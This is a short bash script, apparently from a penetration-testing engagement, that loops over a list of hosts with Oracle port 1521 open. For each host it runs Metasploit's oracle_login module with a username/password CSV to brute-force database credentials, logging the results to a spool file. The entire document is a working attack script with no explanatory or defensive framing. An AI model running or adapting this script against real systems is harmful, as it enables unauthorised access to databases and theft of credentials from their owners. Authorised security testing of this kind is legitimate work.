#!/usr/bin/env -S bash


ip_file="/root/zgz-pen/22-12-26-vrp/oracle.1521.ip.lst"
#ip_file="/root/zgz-pen/22-12-26-vrp/oracle.1521.ip.lst.tmp"
spool_file="/root/zgz-pen/22-12-26-vrp/oracle-brute-msf.res"
csv_file="/root/zgz-pen/22-12-26-vrp/username-pass.csv"

for ip in $(cat ${ip_file}); do
    echo "${ip}"
    msfconsole -q -x "use admin/oracle/oracle_login; set sid db1; set csvfile ${csv_file}; set rhost ${ip}; spool ${spool_file}; options; exploit; exit"
done
